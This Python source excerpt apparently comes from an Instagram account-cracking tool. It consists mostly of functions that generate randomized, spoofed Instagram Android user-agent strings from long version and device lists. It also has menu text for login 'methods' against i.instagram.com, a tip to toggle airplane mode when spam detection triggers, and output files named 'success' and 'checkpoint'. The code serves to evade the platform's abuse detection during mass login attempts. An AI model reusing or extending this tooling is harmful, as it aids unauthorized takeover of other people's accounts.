0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		ua = f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})"
		ua2= f"Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{str(rr(4,13))}; {dpi}dpi; {pxl}; Meizu; MX6; MX6; {com}; {comi})"
		return ua

	def ua_v2(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me=rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
		model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
		build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
		merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
		brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
		cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
		versi_app = str(random.randint(111111111,999999999))
		language = "en_GB"
		try:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		ua = [
		f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})",
		f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; {merk_device}; {brand_device}; {model_device}; {com}; {comi})",
		f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{random.randrange(5,12)}.0.1; {dpi}720x1464; INFINIX MOBILITY LIMITED/Infinix; Infinix X682B; Infinix-X682B; mt6769; tr_TR; 269790803)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (27/{random.randrange(5,12)}.1.0; {dpi}dpi; 1080x2141; vivo; vivo 1907; 1907; mt6768; ru_RU; 388829083)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {dpi}dpi; 720x1280; samsung; SM-E500H; e53g; qcom; in_ID; 98288239)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {dpi}dpi; 720x1370; HMD Global/Nokia; Nokia 4.2; PAN_sprout; qcom; it_IT; 217948971)'
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1; {dpi}dpi; 1080x1794; HMD Global/Nokia; TA-1041; C1N; qcom; en_GB; 382290498)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 720x1440; HUAWEI; DUB-LX1; HWDUB-Q; qcom; en_US; 225283631)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1776; Sony; F5121; F5121; qcom; de_DE; 384108453)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1440x2712; Sony/docomo; SO-01L; SO-01L; qcom; in_ID; 383877306)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/{random.randrange(5,12)}.0.0; {dpi}dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; in_ID; 98288242)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; id_EN; 98288242)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; in_ID; 103516666)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (21/{random.randrange(5,12)}.0.1; {dpi}dpi; 1080x2201; vivo; vivo 1851; 1851; qcom; en_US; 382290498)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x2278; vivo; vivo 1939; 2004; qcom; en_US; 383877305)',
	    f"Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{str(rr(4,13))}; {dpi}dpi; {pxl}; Meizu; MX6; MX6; {com}; {comi})"]
		return random.choice(ua)

	def ua_rmx(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me=rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		ua = f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})"
		return ua

		
	def ingfo(self):
		prints(Panel(f"\t  {P2}Hidupkan Mode Pesawat 10 Detik Jika terdeteksi {M2}SPAM[/]",width=80,padding=(0,3),style=f"{color_table}"))
		prints(Panel(f"  {P2}result/{H2}success-{day}.txt {K2}✘ {P2}result/{K2}checkpoint-{day}.txt",width=80,padding=(0,3),style=f"{color_table}"))
	def ifo(self):
		urut = []
		urut.append(Panel(f' [white][[blue]01[white]]. Method Luciver i.instagram.com[white] [[green]recommend[white]]\n [white][[blue]02[white]]. Method Api i.instagram.com[white] [[green]recommend[white]]\n [white][[blue]03[white]]. Method Api i.instagram.com[white] [[green]recommend[white]]',width=80,title=f"[white]Method Api",style=f"{color_table}"))
		#urut.append(Panel(f' [white][[blue]04[white]]. Method Ajax V1 [white] [[green]recommend[white]]\n [white][[blue]05[white]]. Method Ajax V2 [white] [[green]recommend[white]]\n [white][[blue]06[white]]. Method Ajax V3 [white] [[green]recommend[white]]',width=40,title=f"[white]Method Ajax",style=f"{color_table}"))
		self.tol.print(Columns(urut))
		
	def ua_baru(self):
		rc=random.choice
		igv=self.vers()
		ua = rc([
		f"Instagram {igv} Android (29/10; 280dpi; 720x1472; motorola; moto e(7); malta; mt6762; in_ID; 486308406)",
		f"Instagram {igv} Android (30/11; 480dpi; 1080x2218; motorola; motorola one action; troika_sprout; exynos9610; in_ID; 486308487)",
		f"Instagram {igv} Android (29/10; 272dpi; 720x1358; motorola; moto g(7) play; channel; qcom; in_ID; 483850199)",
		f"Instagram {igv} Android (29/10; 420dpi; 1080x2144; motorola; moto g(8) plus; doha; qcom; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 238dpi; 720x1479; motorola; moto g(20); java; ums512_1h10; in_ID; 483850212)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1528; motorola; moto e22; borag; mt6765; in_ID; 486089352)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1440; motorola; moto g22; hawaiip; mt6765; in_ID; 486308486)",
		f"Instagram {igv} Android (28/9; 280dpi; 720x1418; motorola; moto e(6) plus; pokerp; mt6762; in_ID; 483850199)",
		f"Instagram {igv} Android (28/9; 306dpi; 720x1410; motorola; moto e(6) plus; pokerp; mt6762; in_ID; 483850154)",
		f"Instagram {igv} Android (29/10; 460dpi; 1080x2069; motorola; moto g(8) plus; doha; qcom; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 480dpi; 1080x2266; motorola; motorola one action; troika_sprout; exynos9610; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 280dpi; 720x1466; motorola; moto g(20); java; ums512_1h10; in_ID; 483850212)",
		f"Instagram {igv} Android (29/10; 260dpi; 720x1478; motorola; moto g(8) power lite; blackjack; mt6765; in_ID; 483850070)",
		f"Instagram {igv} Android (30/11; 280dpi; 720x1515; motorola; moto g(9) play; guamp; qcom; in_ID; 483850212)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1472; motorola; moto e22; borag; mt6765; in_ID; 483850086)"])
		return ua
		
	def ua_ran(self):
		rr = random.randint;rc = random.choice;dpis = random.choice(["240dpi", "480dpi", "320dpi", "440dpi", "640dpi","133dpi","320dpi","515dpi","160dpi","640dpi","240dpi","120dpi","800dpi","480dpi","225dpi","768dpi","216dpi","1024dpi","213dpi","450dpi"]);basa =rc(['en_US','en_GB','id_ID','in_ID','de_DE','ru_RU','en_SG','fr_FR','fa_IR','ja_JP','pt_BR','cs_CZ','zh_HK','zh_CN','vi_VN','en_PH','en_IN','tr_TR','it_IT']);pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"]);akhir = rr(399993134,444761830);com=rc(["qcom","mt6833","mt6765","mt8168"]);ver = rr(18,25);si = rr(72,120);versi=self.vers();andro=rc([f"30/{rr(4,23)}",f"31/{rr(4,13)}",f"29/{rr(4,13)}"]);xiaomi=rc(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G'])
		mod=rc(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn'])
		uami=(f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; in_ID)")
		return uami
	def vers(self):
		igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,49.0.0.15.89,48.0.0.15.98,47.0.0.16.96,46.0.0.15.96,45.0.0.17.93,44.0.0.9.93,43.0.0.10.97,42.0.0.19.95,41.0.0.13.92,40.0.0.14.95,39.0.0.19.93,38.0.0.13.95,37.0.0.21.97,36.0.0.13.91,35.0.0.20.96,34.0.0.12.93,33.0.0.11.92,32.0.0.16.94,31.0.0.10.94,30.0.0.12.95,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi

	def ua_sendiri(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me =rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("270.0.0.0.2,270.0.0.0.51,10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0